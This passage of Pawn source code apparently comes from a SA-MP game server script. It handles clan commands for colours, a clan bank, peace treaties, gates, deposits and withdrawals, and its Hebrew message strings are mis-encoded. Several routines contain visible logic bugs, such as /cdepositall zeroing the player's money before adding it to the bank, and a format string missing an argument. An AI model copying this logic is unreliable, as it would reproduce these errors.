				else return SendClientMessage(playerid,red," .àôùøåú äùú÷ú ÷ìàï ö'àè ùâåéä");
			}
			else if(equal(cmd,"color"))
			{
				new r, g, b;
				if(!playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì ä÷ìàï áëãé ìùðåú àú öáò ä÷ìàï");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan edit color [red 0-255] [green 0-255] [blue 0-255] :öåøú äùéîåù");
				r = strval(cmd);
				cmd = strtok(cmdtext,idx), g = !strlen(cmd) || !IsNumeric(cmd)? r:strval(cmd), cmd = strtok(cmdtext,idx), b = !strlen(cmd) || !IsNumeric(cmd)? g:strval(cmd);
				if(r < 0 || r > 255 || g < 0 || g > 255 || b < 0 || b > 255) return SendClientMessage(playerid,red," .àçã îäöáòéí ùâåé");
				if(IsWBColor(r,g,b)) return SendClientMessage(playerid,red," .äöáò ãåîä îãé ìùçåø / ììáï, àðà áçø àçø");
				format(string,sizeof(string)," .ùéðä àú öáò ä÷ìàï ìöáò ääåãòä äæàú %s",GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++)
				{
					SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],rgba2hex(r,g,b,200),string);
					SetPlayerColor(claninfo[playerinfo[playerid][clan]][cplayers][i],rgba2hex(r,g,b,100));
				}
				format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				claninfo[playerinfo[playerid][clan]][ccolor][0] = r;
				claninfo[playerinfo[playerid][clan]][ccolor][1] = g;
				claninfo[playerinfo[playerid][clan]][ccolor][2] = b;
				fsetint(string,"R",r);
				fsetint(string,"G",g);
				fsetint(string,"B",b);
			}
			else return SendClientMessage(playerid,red," .àôùøåú òøéëú ÷ìàï ùâåéä");
		}
		else if(equal(cmd,"bank"))
		{
			if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï øùîé");
			if(!playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì ä÷ìàï áëãé ìòøåê àú äáð÷ ùìå");
			if(claninfo[playerinfo[playerid][clan]][ccp] == -1) return SendClientMessage(playerid,red," .ì÷ìàï ùìê àéï áð÷");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan bank [lock/setpos/maxwithdraw] :öåøú äùéîåù");
			if(equal(cmd,"lock"))
			{
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan bank lock [lock/unlock] :öåøú äùéîåù");
				if(equal(cmd,"lock"))
				{
					if(claninfo[playerinfo[playerid][clan]][clbank]) return SendClientMessage(playerid,red," .äáð÷ ùì ä÷ìàï ëáø ðòåì");
					claninfo[playerinfo[playerid][clan]][clbank] = 1;
					format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
					fsetint(string,"LockBank",1);
					format(string,sizeof(string)," .ðòì àú äáð÷ ùì ä÷ìàï %s",GetName(playerid));
					for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				}
				else if(equal(cmd,"unlock"))
				{
					if(!claninfo[playerinfo[playerid][clan]][clbank]) return SendClientMessage(playerid,red," .äáð÷ ùì ä÷ìàï ëáø ìà ðòåì");
					claninfo[playerinfo[playerid][clan]][clbank] = 0;
					format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
					fsetint(string,"LockBank",0);
					format(string,sizeof(string)," .ôúç àú äáð÷ ùì ä÷ìàï %s",GetName(playerid));
					for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				}
				else return SendClientMessage(playerid,red," .àôùøåú ðòéìú áð÷ ùâåéä");
			}
			else if(equal(cmd,"setpos"))
			{
				new Float:p[3], /*Float:op[3], */clcp = claninfo[playerinfo[playerid][clan]][cbankcp];
				if(clcp == -1) return SendClientMessage(playerid,red," .àéï ì÷ìàï ùìê áð÷");
				if(IsPlayerInAnyVehicle(playerid)) GetVehiclePos(playerid,p[0],p[1],p[2]);
				else GetPlayerPos(playerid,p[0],p[1],p[2]);
				/*for(new i=0,o=0;o<claninfo[playerinfo[playerid][clan]][cobjects];o++)
				{
					i = claninfo[playerinfo[playerid][clan]][cobject][o];
					if(IsValidSObject(i) && objectinfo[i][omoving][1] == playerinfo[playerid][clan])
					{
						GetSObjectPos(i,op[0],op[1],op[2]);
						if(DistanceToPoint(p[0],p[1],p[2],op[0],op[1],op[2]) > 100.0) return SendClientMessage(playerid,red," .äîé÷åí äæä øçå÷ îãé îîô÷ãú ä÷ìàï ùìê");
					}
				}*/
				cpinfo[clcp][cpx] = p[0], cpinfo[clcp][cpy] = p[1], cpinfo[clcp][cpz] = p[2];
				format(string,sizeof(string)," .ùéðä àú îé÷åí äáð÷ ùì äîô÷ãä %s",GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				fsetfloat(string,"CPX",p[0]);
				fsetfloat(string,"CPY",p[1]);
				fsetfloat(string,"CPZ",p[2]);
			}
			else if(equal(cmd,"maxwithdraw"))
			{
				if(playerinfo[playerid][clan] == 0) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï");
				if(!playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì ä÷ìàï áëãé ìùðåú àú öáò ä÷ìàï");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan bank maxwithdraw [max] :öåøú äùéîåù");
				new maxwithdraw = strval(cmd);
				if(maxwithdraw < 0 || maxwithdraw > max_cbank) return SendClientMessage(playerid,red," .(" #max_cbank ":îñôø î÷ñéîåí äåöàä ùâåé (î÷ñéîåí");
				format(string,sizeof(string)," .ùéðä àú îñôø äëñó äî÷ñéîìé ìäåöàä îáð÷ ä÷ìàï ì %d$ %s",maxwithdraw,GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				fsetint(string,"MaxBank",maxwithdraw);
				claninfo[playerinfo[playerid][clan]][cmaxbank] = maxwithdraw;
			}
			else return SendClientMessage(playerid,red," .àôùøåú òøéëú áð÷ ÷ìàï ùâåéä");
		}
		else if(equal(cmd,"peace"))
		{
			if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï øùîé");
			if(!playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì ä÷ìàï áëãé ìòøåê àôùøåéåú ùìåí òí ÷ìàðéí");
			new cname2[M_S], f[M_S];
			cname2 = strtok(cmdtext,idx), cmd = strtok(cmdtext,idx);
			if(!strlen(cname2) || !strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan peace [clan name] [ask/accept/cancel/destroy] :öåøú äùéîåù");
			new clanid = clannumber(cname2);
			if(clanid == -1) return SendClientMessage(playerid,red," .ùí ÷ìàï ùâåé");
			if(equal(cmd,"ask"))
			{
				new peaces = 0;
				for(new i=0;i<MAX_CLANS;i++) if(claninfo[i][cvalid] && claninfo[clanid][cpeace][i] && claninfo[i][cpeace][clanid]) peaces++;
				if(peaces >= MAX_CLANS-1) return SendClientMessage(playerid,red," .àéï àôùøåú ìáöò ùìåí òí îòì ì 100 ÷ìàðéí");
				if(playerinfo[playerid][clan] == clanid) return SendClientMessage(playerid,red," .àéï àôùøåú ìáöò àú äôòåìä äæå òí ä÷ìàï ùìê");
				if(claninfo[playerinfo[playerid][clan]][cpeace][clanid]) return SendClientMessage(playerid,red," .ä÷ìàï ùìê ëáø áùìåí òí ä÷ìàï äæä");
				new ocp = 0;
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == clanid) ocp++;
				if(!ocp) return SendClientMessage(playerid,red," .àéï ùç÷ðéí îçåáøéí î÷ìàï æä åìëï äá÷ùä ìà ðùìçä");
				format(string,sizeof(string)," .%s ,îöéò ìëí ùìåí òí ä÷ìàï ùìå %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == clanid) SendClientMessage(i,green,string);
				claninfo[playerinfo[playerid][clan]][cask][clanid] = 1;
				format(string,sizeof(string)," .ðùìçä %s äá÷ùä ùìê ìùìåí òí ä÷ìàï",claninfo[clanid][cname]);
				SendClientMessage(playerid,green,string);
				format(string,sizeof(string)," .%s áé÷ù ùìåí òí ä÷ìàï %s",claninfo[clanid][cname],GetName(playerid));
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan] && i != playerid) SendClientMessage(i,green,string);
			}
			else if(equal(cmd,"accept"))
			{
				if(playerinfo[playerid][clan] == clanid) return SendClientMessage(playerid,red," .àéï àôùøåú ìáöò àú äôòåìä äæå òí ä÷ìàï ùìê");
				if(!claninfo[clanid][cask][playerinfo[playerid][clan]]) return SendClientMessage(playerid,red," .ä÷ìàï äæä ìà áé÷ù ùìåí òí ä÷ìàï ùìê");
				claninfo[clanid][cpeace][playerinfo[playerid][clan]] = 1,
				claninfo[playerinfo[playerid][clan]][cask][clanid] = 0,
				claninfo[clanid][cpeace][playerinfo[playerid][clan]] = 1,
				claninfo[playerinfo[playerid][clan]][cask][clanid] = 0;
				format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				for(new i=0;i<MAX_CLANS;i++)
				{
					format(string,sizeof(string),"Peace%d",i);
					if(fkeyexist(f,string)) continue;
					fsetstring(f,string,claninfo[clanid][cname]);
					break;
				}
				format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
				for(new i=0;i<MAX_CLANS;i++)
				{
					format(string,sizeof(string),"Peace%d",i);
					if(fkeyexist(f,string)) continue;
					fsetstring(f,string,claninfo[clanid][cname]);
					break;
				}
				format(string,sizeof(string)," !%s å %s äåñëí ùìåí áéï ä÷ìàðéí",claninfo[playerinfo[playerid][clan]][cname],claninfo[clanid][cname]);
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == clanid || playerinfo[i][clan] == playerinfo[playerid][clan])) SendClientMessage(i,green,string);
			}
			else if(equal(cmd,"cancel"))
			{
				if(playerinfo[playerid][clan] == clanid) return SendClientMessage(playerid,red," .àéï àôùøåú ìáöò àú äôòåìä äæå òí ä÷ìàï ùìê");
				if(!claninfo[clanid][cask][playerinfo[playerid][clan]]) return SendClientMessage(playerid,red," .ä÷ìàï äæä ìà áé÷ù ùìåí òí ä÷ìàï ùìê");
				claninfo[clanid][cpeace][playerinfo[playerid][clan]] = 0,
				claninfo[playerinfo[playerid][clan]][cask][clanid] = 0,
				claninfo[clanid][cpeace][playerinfo[playerid][clan]] = 0,
				claninfo[playerinfo[playerid][clan]][cask][clanid] = 0;
				format(string,sizeof(string)," .ìà äñëéí ìùìåí %s îä÷ìàï %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == clanid || playerinfo[i][clan] == playerinfo[playerid][clan])) SendClientMessage(i,red,string);
			}
			else if(equal(cmd,"destroy"))
			{
				if(playerinfo[playerid][clan] == clanid) return SendClientMessage(playerid,red," .àéï àôùøåú ìáöò àú äôòåìä äæå òí ä÷ìàï ùìê");
				if(!claninfo[playerinfo[playerid][clan]][cpeace][clanid]) return SendClientMessage(playerid,red," .ä÷ìàï ùìê ìà áùìåí òí ä÷ìàï äæä");
				claninfo[clanid][cpeace][playerinfo[playerid][clan]] = 0,
				claninfo[playerinfo[playerid][clan]][cask][clanid] = 0,
				claninfo[clanid][cpeace][playerinfo[playerid][clan]] = 0,
				claninfo[playerinfo[playerid][clan]][cask][clanid] = 0;
				format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				for(new i=0;i<MAX_CLANS;i++)
				{
					format(string,sizeof(string),"Peace%d",i);
					if(fkeyexist(f,string) && equal(fgetstring(f,string),claninfo[clanid][cname]))
					{
						fremovekey(f,string);
						break;
					}
				}
				format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
				for(new i=0;i<MAX_CLANS;i++)
				{
					format(string,sizeof(string),"Peace%d",i);
					if(fkeyexist(f,string) && equal(fgetstring(f,string),claninfo[clanid][cname]))
					{
						fremovekey(f,string);
						break;
					}
				}
				format(string,sizeof(string)," .%s äåôñ÷ òì éãéé %s å %s äùìåí áéï ä÷ìàðéí",GetName(playerid),claninfo[playerinfo[playerid][clan]][cname],claninfo[clanid][cname]);
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == clanid || playerinfo[i][clan] == playerinfo[playerid][clan])) SendClientMessage(i,red,string);
			}
			else return SendClientMessage(playerid,red," .àôùøåú òøéëú áð÷ ÷ìàï ùâåéä");
		}
		else if(equal(cmd,"info"))
		{
			new clanid, infocmd;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan info [members/details] [clan name] :öåøú äùéîåù");
			infocmd = equal(cmd,"members")? 1:2, cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåáø åøùåí");
				if(!playerinfo[playerid][clan] || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï");
				else
				{
					format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
					clanid = fgetint(string,"ID");
				}
			}
			else
			{
				format(string,sizeof(string),"/DM/Clans/%s.ini",cmd);
				if(!fexist(string)) return SendClientMessage(playerid,red," .÷ìàï ùâåé");
				else clanid = fgetint(string,"ID");
			}
			switch(infocmd)
			{
				case 1:
				{
					format(claninfo[clanid][cname],256,fgetstring(string,"Name"));
					format(string,sizeof(string)," ~~~ :\"%s\" çáøé ä÷ìàï ~~~",claninfo[clanid][cname]);
					SendClientMessage(playerid,lightblue,string);
					if(!claninfo[clanid][cmembers]) return SendClientMessage(playerid,red," .àéï ùç÷ðéí á÷ìàï æä");
					new col = yellow;
					for(new i=0;i<MAX_PLAYERS;i++)
					{
						if(playerinfo[i][clan] == clanid)
						{
							if(playerinfo[i][lclan]) col = orange;
							else if(playerinfo[i][tclan]) col = pink;
							format(string,sizeof(string),"  %s (ID: %03d)",GetName(i),i);
							SendClientMessage(playerid,col,string);
						}
					}
				}
				case 2:
				{
					new peaceWithClans[M_S], peaces = 0;
					format(claninfo[clanid][cname],256,fgetstring(string,"Name"));
					for(new i=0;i<MAX_CLANS;i++)
					{
						if(claninfo[i][cvalid] && claninfo[clanid][cpeace][i] && claninfo[i][cpeace][clanid])
						{
							peaces++;
							format(peaceWithClans,sizeof(peaceWithClans),"%s, %s",claninfo[i][cname]);
						}
					}
					strdel(peaceWithClans,0,1);
					format(string,sizeof(string)," ~~~ :\"%s\" ôøèé ä÷ìàï ~~~",claninfo[clanid][cname]);
					SendClientMessage(playerid,lightblue,string);
					format(string,sizeof(string)," îñôø ùç÷ðéí îçåáøéí: %d",claninfo[clanid][cmembers]);
					SendClientMessage(playerid,green,string);
					format(string,sizeof(string)," ôúåç ìèñèéí: %s",claninfo[clanid][ctest]? ("ëï"):("ìà"));
					SendClientMessage(playerid,green,string);
					if(!peaces) format(string,sizeof(string)," ùìåí òí ä÷ìàðéí: àéï");
					else format(string,sizeof(string)," %s :ùìåí òí ä÷ìàðéí - %d",peaceWithClans,peaces);
					SendClientMessage(playerid,green,string);
					new ckills = 0;
					for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == clanid) ckills += playerinfo[i][kills];
					format(string,sizeof(string)," çéùåá ääøéâåú ùì ëì çáøé ä÷ìàï äîçåáøéí: %d",ckills);
					SendClientMessage(playerid,green,string);
				}
				default: return SendClientMessage(playerid,red," .àôùøåú äöâú îéãò ÷ìàï ùâåéä");
			}
		}
		else return SendClientMessage(playerid,red," .àôùøåú ÷ìàï ùâåéä");
		return 1;
	}
	if(equal(cmd,"/ogate") || equal(cmd,"/og"))
	{
		new theGate = -1;
		for(new i=0;i<max_objects;i++)
		{
			if(GetPlayerDistanceToPoint(playerid,objectinfo[i][opos][0],objectinfo[i][opos][1]) <= 14.0 && objectinfo[i][omoving][0])
			{
				theGate = i;
				break;
			}
		}
		if(theGate == -1) return SendClientMessage(playerid,red," .àéï ìéãê ùåí àåáéé÷è äðéúï ìôúéçä");
		if(playerinfo[playerid][admin] < 19 && !playerinfo[playerid][clanmanager])
		{
			if(playerinfo[playerid][clan] == 0 && !(objectinfo[theGate][omoving][1] == 100 && IsPlayerMAdmin(playerid))) return SendClientMessage(playerid,red," .òìéê ìäéåú á÷ìàï ìùéîåù áô÷åãä æå");
			if(objectinfo[theGate][omoving][1] != playerinfo[playerid][clan] && !claninfo[playerinfo[playerid][clan]][cpeace][objectinfo[theGate][omoving][1]]/* && !(objectinfo[theGate][omoving][1] == 100 && IsPlayerMAdmin(playerid))*/) return SendClientMessage(playerid,red," .äàåáéé÷è äæä ìà ùééê ì÷ìàï ùìê");
		}
		if(objectinfo[theGate][omoving][2]) return SendClientMessage(playerid,red," .äàåáéé÷è äæä ëáø ôúåç");
		StopObject(theGate);
		MoveSObject(theGate,objectinfo[theGate][omoveto][0],objectinfo[theGate][omoveto][1],objectinfo[theGate][omoveto][2],3.5);
		objectinfo[theGate][omoving][2] = 1;
		return 1;
	}
	if(equal(cmd,"/cgate") || equal(cmd,"/cg"))
	{
		new theGate = -1;
		for(new i=0;i<max_objects;i++)
		{
			if(GetPlayerDistanceToPoint(playerid,objectinfo[i][opos][0],objectinfo[i][opos][1]) <= 14.0 && objectinfo[i][omoving][0])
			{
				theGate = i;
				break;
			}
		}
		if(theGate == -1) return SendClientMessage(playerid,red," .àéï ìéãê ùåí àåáéé÷è äðéúï ìñâéøä");
		if(playerinfo[playerid][admin] < 19 && !playerinfo[playerid][clanmanager])
		{
			if(playerinfo[playerid][clan] == 0 && !(objectinfo[theGate][omoving][1] == 100 && IsPlayerMAdmin(playerid))) return SendClientMessage(playerid,red," .òìéê ìäéåú á÷ìàï ìùéîåù áô÷åãä æå");
			if(objectinfo[theGate][omoving][1] != playerinfo[playerid][clan] && !claninfo[playerinfo[playerid][clan]][cpeace][objectinfo[theGate][omoving][1]]/* && !(objectinfo[theGate][omoving][1] == 100 && IsPlayerMAdmin(playerid))*/) return SendClientMessage(playerid,red," .äàåáéé÷è äæä ìà ùééê ì÷ìàï ùìê");
		}
		if(!objectinfo[theGate][omoving][2]) return SendClientMessage(playerid,red," .äàåáéé÷è äæä ëáø ñâåø");
		StopObject(theGate);
		MoveSObject(theGate,objectinfo[theGate][opos][0],objectinfo[theGate][opos][1],objectinfo[theGate][opos][2],3.5);
		objectinfo[theGate][omoving][2] = 0;
		return 1;
	}
	if(equal(cmd,"/cdeposit"))
	{
		if(playerinfo[playerid][clan] == 0) return SendClientMessage(playerid,red," .òìéê ìäéåú á÷ìàï ìùéîåù áô÷åãä æå");
		if(claninfo[playerinfo[playerid][clan]][clbank] && !playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .äáð÷ ùì ä÷ìàï ùìê ðòåì");
		if((GetPlayerCheckpoint(playerid) != cp_cbank && GetPlayerCheckpoint(playerid) != cp_bank) || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ ÷ìàï áëãé ìáöò ô÷åãä æå");
		if(cpinfo[playerinfo[playerid][cp]][cpclan] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .äáð÷ äæä ìà ùééê ì÷ìàï ùìê");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /cdeposit [amount] :öåøú äùéîåù");
		new amount = strval(cmd), string[M_S];
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ñëåí äô÷ãä ùâåé");
		if(amount+claninfo[playerinfo[playerid][clan]][cbank] > max_cbank) return SendClientMessage(playerid,red," .$" #max_cbank " áð÷ ä÷ìàï éëåì ìäëéì òã");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		SetTimerEx("CanP",15000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		GiveMoney(playerid,0-amount);
		claninfo[playerinfo[playerid][clan]][cbank] += amount;
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		fsetint(string,"Bank2",claninfo[playerinfo[playerid][clan]][cbank]);
		format(string,sizeof(string)," .äô÷ãú %d$ áçùáåï äáð÷ ùì ä÷ìàï ùìê, ëòú éù áçùáåï %d$",amount,claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/cwithdraw"))
	{
		new amount, string[M_S];
		if(playerinfo[playerid][clan] == 0) return SendClientMessage(playerid,red," .òìéê ìäéåú á÷ìàï ìùéîåù áô÷åãä æå");
		if(claninfo[playerinfo[playerid][clan]][clbank] && !playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .äáð÷ ùì ä÷ìàï ùìê ðòåì");
		if((GetPlayerCheckpoint(playerid) != cp_cbank && GetPlayerCheckpoint(playerid) != cp_bank) || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ ÷ìàï áëãé ìáöò ô÷åãä æå");
		if(cpinfo[playerinfo[playerid][cp]][cpclan] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .äáð÷ äæä ìà ùééê ì÷ìàï ùìê");
		if(!playerinfo[playerid][canwithdraw]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		playerinfo[playerid][canwithdraw] = 0;
		SetTimerEx("CanWithdraw",10000,0,"d",playerid);
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /cwithdraw [amount] :öåøú äùéîåù");
		amount = strval(cmd);
		if(amount < 1 || amount > claninfo[playerinfo[playerid][clan]][cbank]) return SendClientMessage(playerid,red," .ñëåí äåöàä ùâåé");
		if(amount > claninfo[playerinfo[playerid][clan]][cmaxbank])
		{
			format(string,sizeof(string)," .ðéúï ìäåöéà îçùáåï äáð÷ ùì ä÷ìàï ùìê òã %d$",claninfo[playerinfo[playerid][clan]][cmaxbank]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		GiveMoney(playerid,amount);
		claninfo[playerinfo[playerid][clan]][cbank] -= amount;
		format(string,sizeof(string)," .äåöàú %d$ îçùáåï äáð÷ ùì ä÷ìàï ùìê, ëòú éù áçùáåï %d$",amount,claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		fsetint(string,"Bank2",claninfo[playerinfo[playerid][clan]][cbank]);
		return 1;
	}
	if(equal(cmd,"/cbalance"))
	{
		new string[M_S];
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .òìéê ìäéåú á÷ìàï ìùéîåù áô÷åãä æå");
		if((GetPlayerCheckpoint(playerid) != cp_cbank && GetPlayerCheckpoint(playerid) != cp_bank) || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ ÷ìàï áëãé ìáöò ô÷åãä æå");
		if(cpinfo[playerinfo[playerid][cp]][cpclan] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .äáð÷ äæä ìà ùééê ì÷ìàï ùìê");
		format(string,sizeof(string)," .%d$ áçùáåï äáð÷ ùì ä÷ìàï ùìê éù",claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/clans"))
	{
		new clans = 0, clanCM = 0, string[M_S];
		for(new i=1;i<MAX_CLANS;i++) if(claninfo[i][cvalid]) clans++;
		if(!clans) return SendClientMessage(playerid,red," .àéï ÷ìàðéí áùøú ëøâò");
		SendClientMessage(playerid,lightblue," ~~~ :÷ìàðéí áùøú ~~~");
		for(new i=1;i<MAX_CLANS;i++)
		{
			if(claninfo[i][cvalid])
			{
				clanCM = 0;
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && playerinfo[ii][clan] == i) clanCM++;
				format(string,sizeof(string)," \"%s\" (Connected members: %d, ClanID: %d, Tests: %s)",claninfo[i][cname],clanCM,i,claninfo[i][ctest]? ("ôúåç"):("ñâåø"));
				SendClientMessage(playerid,yellow,string);
			}
		}
		if(clans >= 9)
		{
			SendClientMessage(playerid,red," .äúâìä ëé îñôø ä÷ìàðéí ä÷ééîéí áùøú âãåì îãé ìäöâä áö'àè áçì÷ àçã");
			SendClientMessage(playerid,red," .PageUp+PageDown áëãé ìøàåú àú äçì÷éí äàçøéí ùì ä÷ìàðéí äùúîù áëôúåøéí");
		}
		return 1;
	}
	if(equal(cmd,"/cdepositall"))
	{
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï");
		if(claninfo[playerinfo[playerid][clan]][clbank] && !playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .äáð÷ ùì ä÷ìàï ùìê ðòåì");
		if((GetPlayerCheckpoint(playerid) != cp_cbank && GetPlayerCheckpoint(playerid) != cp_bank) || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ ÷ìàï áëãé ìáöò ô÷åãä æå");
		if(cpinfo[playerinfo[playerid][cp]][cpclan] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .äáð÷ äæä ìà ùééê ì÷ìàï ùìê");
		if(GetMoney(playerid) <= 0) return SendClientMessage(playerid,red," .àéï áééãê ëñó äðéúï ìäô÷ãä");
		new string[M_S];
		if(GetMoney(playerid)+claninfo[playerinfo[playerid][clan]][cbank] > max_cbank) return SendClientMessage(playerid,red," .$" #max_cbank " áð÷ ä÷ìàï éëåì ìäëéì òã");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		SetTimerEx("CanP",15000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		GiveMoney(playerid,0-GetMoney(playerid));
		claninfo[playerinfo[playerid][clan]][cbank] += GetMoney(playerid);
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		fsetint(string,"Bank2",claninfo[playerinfo[playerid][clan]][cbank]);
		format(string,sizeof(string)," .äô÷ãú àúëì ëñôê áçùáåï äáð÷ ùì ä÷ìàï ùìê, ëòú éù ùí %d$",claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/cwithdrawall"))
	{
		new string[M_S];
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï");
		if(claninfo[playerinfo[playerid][clan]][clbank] && !playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .äáð÷ ùì ä÷ìàï ùìê ðòåì");
		if((GetPlayerCheckpoint(playerid) != cp_cbank && GetPlayerCheckpoint(playerid) != cp_bank) || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ ÷ìàï áëãé ìáöò ô÷åãä æå");
		if(cpinfo[playerinfo[playerid][cp]][cpclan] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .äáð÷ äæä ìà ùééê ì÷ìàï ùìê");
		if(claninfo[playerinfo[playerid][clan]][cbank] > claninfo[playerinfo[playerid][clan]][cmaxbank])
		{
			format(string,sizeof(string)," .ðéúï ìäåöéà îçùáåï äáð÷ ùì ä÷ìàï ùìê òã %d$",claninfo[playerinfo[playerid][clan]][cmaxbank]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		GiveMoney(playerid,claninfo[playerinfo[playerid][clan]][cbank]);
		claninfo[playerinfo[playerid][clan]][cbank] = 0;
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		fsetint(string,"Bank2",claninfo[playerinfo[playerid][clan]][cbank]);
		format(string,sizeof(string)," .äô÷ãú àúëì ëñôê áçùáåï äáð÷ ùì ä÷ìàï ùìê, ëòú éù ùí %d$",claninfo[playerinfo[playerid][clan]][cbank]);
